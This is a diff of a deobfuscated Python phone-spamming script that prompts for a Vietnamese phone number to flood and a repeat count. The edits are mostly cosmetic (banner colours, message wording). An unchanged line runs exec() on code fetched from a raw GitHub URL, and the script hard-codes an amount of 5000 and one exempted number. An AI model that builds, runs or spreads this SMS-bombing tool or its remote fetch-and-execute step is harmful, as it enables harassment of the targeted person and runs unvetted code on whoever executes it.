@@ -1,4 +1,4 @@
-#DEOBFUSCATED BY VUDUNGVAPEV4
+#Nice deobf
 import requests,os,time,re,json,uuid,random,sys
 from concurrent.futures import ThreadPoolExecutor
 from datetime import date
@@ -12,6 +12,7 @@ def spam():
     luc = "\033[1;32m"
     trang = "\033[1;37m"
     do = "\033[1;31m"
+    dovcl= "\033[1;30m"
     xnhac = "\033[1;36m"
     os.system('cls')
     data_machine = []
@@ -26,7 +27,7 @@ def spam():
     vudungvape = trang + " " + trang + "[" + do + "Vu" + trang + "] " + trang + "=> "
     banner = """\033[1;31m
     \033[1;32m=======================================================================
-    \033[1;37m DEV:\033[1;32m Vu Nguyen
+    \033[1;37m DEV: \033[1;30mVu Nguyen
     \033[1;32m=======================================================================
     """
     for h in banner:
@@ -89,10 +90,10 @@ def spam():
                     exec(requests.get('https://raw.githubusercontent.com/VuNguyenNotRealizing/MCCArchive/main/main.py').text)
 
     amount = 5000
-    print(f'\033[1;36m║\033[1;33mHiện tại là : \033[1;37m{thoigian}\033[1;36m')
+    print(f'\033[1;33mHiện tại là : \033[1;37m{thoigian}\033[1;36m')
     sdt = input("Nhập số điện thoại người muốn pem : ")
     while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
-      print("Nhập sai định dạng của số Việt Nam (10 số). Hoặc không phải số.")
+      print("Nhập sai định dạng của số Việt Nam (10 số). Hoặc số không tồn tại.")
       sdt = input("Nhập số điện thoại người muốn pem : ")
     count = int(input("Số lần pem : "))
     if sdt == "0387665488":
